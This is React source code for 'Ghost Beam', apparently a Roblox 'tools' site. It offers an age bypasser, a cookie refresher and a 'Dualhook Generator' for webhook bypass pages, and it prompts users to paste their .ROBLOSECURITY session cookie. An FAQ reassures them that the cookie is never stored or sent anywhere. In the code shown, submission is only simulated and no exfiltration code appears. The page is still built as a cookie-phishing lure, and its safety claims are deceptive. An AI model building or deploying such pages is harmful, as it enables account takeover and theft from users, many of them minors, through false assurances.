import React, { useState, useEffect } from 'react';
import { AnimatePresence, motion } from 'framer-motion';
import { 
  Grid, 
  Shield, 
  CheckSquare, 
  RefreshCw, 
  Mail, 
  Plus, 
  Link as LinkIcon, 
  Trash2, 
  X, 
  ChevronDown, 
  BadgeCheck 
} from 'lucide-react';

// Using standard import syntax as required by the environment for assets
import profileImg from "@assets/536a85e52aaf91401cd105108c599245_1784941568122.jpg";

// Types
type Tool = {
  id: string;
  name: string;
  description: string;
  icon: React.ElementType;
};

// Tool Data
const TOOLS: Tool[] = [
  { id: 'age', name: 'Age Bypasser', description: 'Bypass age restrictions on Roblox accounts', icon: Shield },
  { id: 'checker', name: 'Account Checker', description: 'Check account details and inventory', icon: CheckSquare },
  { id: 'refresh', name: 'Cookie Refresher', description: 'Refresh your Roblox cookie', icon: RefreshCw },
  { id: 'email', name: 'Email Adder', description: 'Add and verify emails on accounts', icon: Mail },
  { id: 'gamepass', name: 'Gamepass Tool', description: 'Create and purchase gamepasses', icon: Plus },
  { id: 'dualhook', name: 'Dualhook Generator', description: 'Generate custom bypass pages with your webhooks', icon: LinkIcon },
  { id: 'cleaner', name: 'Cookie Cleaner', description: 'Cleans cookies with extra symbols, spaces, or wrappers. Does not change your cookie value — works whether the cookie is valid or not', icon: Trash2 },
];

const FAQS = [
  {
    question: "Is this safe to use?",
    answer: "Ghost Beam uses secure processing and never stores your cookie. Your data is processed locally and never sent to third-party servers."
  },
  {
    question: "How long does the bypass take?",
    answer: "The bypass process typically takes 10–30 seconds depending on server load. Please be patient and do not refresh the page."
  },
  {
    question: "Why do I need to provide my cookie?",
    answer: "The .ROBLOSECURITY cookie is required to authenticate with Roblox's servers. Without it, we cannot process account modifications."
  },
  {
    question: "Does it work on all accounts?",
    answer: "Ghost Beam works on most Roblox accounts. Some accounts with extra security measures may require additional steps."
  }
];

export default function App() {
  const [showDiscordModal, setShowDiscordModal] = useState(true);
  const [isToolsOpen, setIsToolsOpen] = useState(false);
  const [selectedToolId, setSelectedToolId] = useState(TOOLS[0].id);
  const [cookieInput, setCookieInput] = useState("");
  const [isVerifying, setIsVerifying] = useState(false);
  
  // Prevent scrolling when panel/modal is open
  useEffect(() => {
    if (showDiscordModal || isToolsOpen) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }
  }, [showDiscordModal, isToolsOpen]);

  const selectedTool = TOOLS.find(t => t.id === selectedToolId) || TOOLS[0];

  const handleVerify = (e: React.FormEvent) => {
    e.preventDefault();
    if (!cookieInput.trim()) return;
    setIsVerifying(true);
    // Simulate verification
    setTimeout(() => {
      setIsVerifying(false);
    }, 2000);
  };

  return (
    <div className="min-h-screen w-full bg-background text-foreground flex justify-center selection:bg-primary/30">
      {/* Mobile container - max width applied here */}
      <div className="w-full max-w-[480px] flex flex-col relative bg-background shadow-2xl">
        
        {/* HEADER */}
        <header className="sticky top-0 z-10 bg-background/80 backdrop-blur-md border-b border-border flex items-center justify-between px-6 py-4">
          <h1 className="font-bold text-xl tracking-wider text-white">GHOST BEAM</h1>
          <button 
            onClick={() => setIsToolsOpen(true)}
            className="p-2 -mr-2 text-muted-foreground hover:text-white transition-colors rounded-md active:bg-white/5"
            aria-label="Open Tools"
          >
            <Grid className="w-6 h-6" />
          </button>
        </header>

        {/* MAIN CONTENT */}
        <main className="flex-1 flex flex-col px-6 py-8 gap-8 overflow-y-auto">
          
          {/* ANNOUNCEMENT CARD */}
          <div className="bg-card border border-card-border rounded-xl p-5 relative overflow-hidden group">
            <div className="absolute top-0 left-0 w-1 h-full bg-amber-500/50 group-hover:bg-amber-500 transition-colors" />
            
            <div className="flex items-center gap-2 mb-4">
              <span className="text-[10px] font-bold tracking-widest text-amber-500 bg-amber-500/10 px-2 py-1 rounded-sm uppercase">
                Announcement
              </span>
            </div>
            
            <div className="flex gap-4">
              <img 
                src={profileImg} 
                alt="Mzk" 
                className="w-10 h-10 rounded-full object-cover border border-border"
              />
              <div className="flex-1">
                <div className="flex items-center gap-1.5 mb-1">
                  <span className="font-semibold text-white">Mzk</span>
                  <BadgeCheck className="w-4 h-4 text-primary" />
                </div>
                <p className="text-sm text-gray-300 leading-relaxed">
                  The Age Bypasser is back online. You can now bypass age restrictions on your account again. Thank you for your patience.
                </p>
                <p className="text-xs text-muted-foreground mt-3">
                  Today at 14:30
                </p>
              </div>
            </div>
          </div>

          {/* MAIN TOOL AREA */}
          <div className="flex flex-col gap-6 mt-2">
            <div className="text-center flex flex-col items-center">
              <div className="w-16 h-16 rounded-2xl bg-primary/10 flex items-center justify-center mb-4 border border-primary/20 shadow-[0_0_15px_rgba(59,130,246,0.15)]">
                <selectedTool.icon className="w-8 h-8 text-primary" />
              </div>
              <h2 className="text-2xl font-bold text-white mb-2">{selectedTool.name}</h2>
              <p className="text-sm text-muted-foreground">{selectedTool.description}</p>
            </div>

            <form onSubmit={handleVerify} className="flex flex-col gap-4 mt-4">
              <div className="flex flex-col gap-2">
                <label htmlFor="cookie" className="text-xs font-semibold tracking-wider text-muted-foreground ml-1">
                  .ROBLOSECURITY
                </label>
                <input
                  id="cookie"
                  type="password"
                  value={cookieInput}
                  onChange={(e) => setCookieInput(e.target.value)}
                  placeholder="Paste your cookie here..."
                  className="w-full bg-input border border-border rounded-lg px-4 py-3.5 text-sm text-white focus:outline-none focus:ring-1 focus:ring-primary focus:border-primary transition-all placeholder:text-muted-foreground/50"
                  required
                />
              </div>

              <button
                type="submit"
                disabled={isVerifying || !cookieInput}
                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-semibold py-3.5 rounded-lg transition-all active:scale-[0.98] disabled:opacity-50 disabled:active:scale-100 disabled:pointer-events-none flex items-center justify-center gap-2"
              >
                {isVerifying ? (
                  <>
                    <RefreshCw className="w-5 h-5 animate-spin" />
                    Verificando...
                  </>
                ) : (
                  'Verify'
                )}
              </button>

              <p className="text-[11px] text-destructive/80 leading-relaxed text-center mt-2 px-2">
                WARNING: DO NOT SHARE YOUR COOKIE WITH ANYONE. Treat it like a password — someone could use it to log in as you.
              </p>
            </form>
          </div>

          <div className="h-px w-full bg-border my-2" />

          {/* FAQ SECTION */}
          <div className="flex flex-col gap-4 mb-4">
            <h3 className="text-sm font-bold tracking-wider text-white uppercase ml-1">FAQ</h3>
            <div className="flex flex-col gap-3">
              {FAQS.map((faq, idx) => (
                <AccordionItem key={idx} question={faq.question} answer={faq.answer} />
              ))}
            </div>
          </div>

        </main>

        {/* FOOTER */}
        <footer className="py-6 border-t border-border mt-auto">
          <p className="text-center text-xs text-muted-foreground">
            GHOST BEAM Tools v1.0
          </p>
        </footer>

        {/* TOOLS PANEL OVERLAY */}
        <AnimatePresence>
          {isToolsOpen && (
            <>
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                onClick={() => setIsToolsOpen(false)}
                className="absolute inset-0 bg-black/60 backdrop-blur-sm z-40"
              />
              <motion.div 
                initial={{ x: '100%' }}
                animate={{ x: 0 }}
                exit={{ x: '100%' }}
                transition={{ type: 'spring', damping: 25, stiffness: 200 }}
                className="absolute top-0 right-0 bottom-0 w-full sm:w-[85%] bg-card border-l border-border z-50 flex flex-col shadow-2xl"
              >
                <div className="flex items-center justify-between px-6 py-5 border-b border-border">
                  <div>
                    <h2 className="font-bold text-lg text-white">TOOLS</h2>
                    <p className="text-xs text-muted-foreground">Select a tool to use</p>
                  </div>
                  <button 
                    onClick={() => setIsToolsOpen(false)}
                    className="p-2 -mr-2 text-muted-foreground hover:text-white rounded-md bg-white/5"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>
                
                <div className="flex-1 overflow-y-auto p-4 flex flex-col gap-2">
                  {TOOLS.map((tool) => {
                    const isSelected = tool.id === selectedToolId;
                    const Icon = tool.icon;
                    return (
                      <button
                        key={tool.id}
                        onClick={() => {
                          setSelectedToolId(tool.id);
                          setIsToolsOpen(false);
                        }}
                        className={`w-full text-left flex items-start gap-4 p-4 rounded-xl border transition-all ${
                          isSelected 
                            ? 'bg-primary/10 border-primary/30' 
                            : 'bg-background/50 border-transparent hover:bg-white/5 hover:border-white/10'
                        }`}
                      >
                        <div className={`mt-0.5 p-2 rounded-lg ${isSelected ? 'bg-primary text-white' : 'bg-white/10 text-muted-foreground'}`}>
                          <Icon className="w-5 h-5" />
                        </div>
                        <div className="flex-1 pr-2">
                          <h4 className={`font-semibold mb-1 ${isSelected ? 'text-primary' : 'text-white'}`}>
                            {tool.name}
                          </h4>
                          <p className="text-xs text-muted-foreground leading-snug">
                            {tool.description}
                          </p>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </motion.div>
            </>
          )}
        </AnimatePresence>

        {/* DISCORD MODAL */}
        <AnimatePresence>
          {showDiscordModal && (
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 bg-black/80 backdrop-blur-md z-[100] flex items-center justify-center p-6"
            >
              <motion.div 
                initial={{ scale: 0.95, y: 20 }}
                animate={{ scale: 1, y: 0 }}
                exit={{ scale: 0.95, y: 20 }}
                className="bg-card border border-border rounded-2xl w-full max-w-sm overflow-hidden flex flex-col shadow-2xl"
              >
                <div className="bg-primary/10 p-6 flex flex-col items-center text-center border-b border-border relative overflow-hidden">
                  <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-32 bg-primary/20 blur-3xl rounded-full pointer-events-none" />
                  
                  <div className="w-16 h-16 bg-[#5865F2] rounded-2xl flex items-center justify-center mb-4 shadow-lg rotate-3 z-10">
                    <svg className="w-8 h-8 text-white" viewBox="0 0 127.14 96.36" fill="currentColor">
                      <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.31,60,73.31,53s5-12.74,11.43-12.74S96.2,46,96.12,53,91.08,65.69,84.69,65.69Z" />
                    </svg>
                  </div>
                  <h2 className="text-xl font-bold text-white mb-1 z-10">Join Our Community</h2>
                  <p className="text-sm text-primary/80 font-medium z-10">Connect with thousands of users</p>
                </div>
                
                <div className="p-6 flex flex-col gap-4">
                  <div className="bg-background/50 border border-border rounded-xl p-4 flex items-center gap-4">
                    <div className="w-12 h-12 bg-card rounded-full flex items-center justify-center border border-border shadow-inner">
                      <Shield className="w-6 h-6 text-white" />
                    </div>
                    <div>
                      <div className="font-bold text-white text-sm">Ghost Beam Community</div>
                      <div className="text-xs text-muted-foreground flex items-center gap-1.5 mt-0.5">
                        <span className="w-2 h-2 rounded-full bg-green-500"></span>
                        Active Support
                      </div>
                    </div>
                  </div>
                  
                  <a 
                    href="https://discord.gg/zxNqr8Zpd" 
                    target="_blank"
                    rel="noreferrer"
                    className="w-full bg-[#5865F2] hover:bg-[#4752C4] text-white font-semibold py-3.5 rounded-lg transition-colors text-center text-sm shadow-lg shadow-[#5865F2]/20"
                    onClick={() => setShowDiscordModal(false)}
                  >
                    Join Discord Server
                  </a>
                  
                  <button 
                    onClick={() => setShowDiscordModal(false)}
                    className="text-xs font-medium text-muted-foreground hover:text-white transition-colors text-center mt-2"
                  >
                    Maybe Later
                  </button>
                </div>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>

      </div>
    </div>
  );
}

// Simple internal accordion component
function AccordionItem({ question, answer }: { question: string, answer: string }) {
  const [isOpen, setIsOpen] = useState(false);
  
  return (
    <div className="bg-card border border-card-border rounded-xl overflow-hidden">
      <button 
        onClick={() => setIsOpen(!isOpen)}
        className="w-full flex items-center justify-between p-4 text-left transition-colors hover:bg-white/[0.02]"
      >
        <span className="font-medium text-sm text-white pr-4">{question}</span>
        <ChevronDown className={`w-4 h-4 text-muted-foreground transition-transform duration-300 ${isOpen ? 'rotate-180' : ''}`} />
      </button>
      
      <AnimatePresence>
        {isOpen && (
          <motion.div
            initial={{ height: 0, opacity: 0 }}
            animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }}
            transition={{ duration: 0.2 }}
          >
            <div className="p-4 pt-0 text-sm text-muted-foreground leading-relaxed">
              <div className="pt-2 border-t border-border/50">
                {answer}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
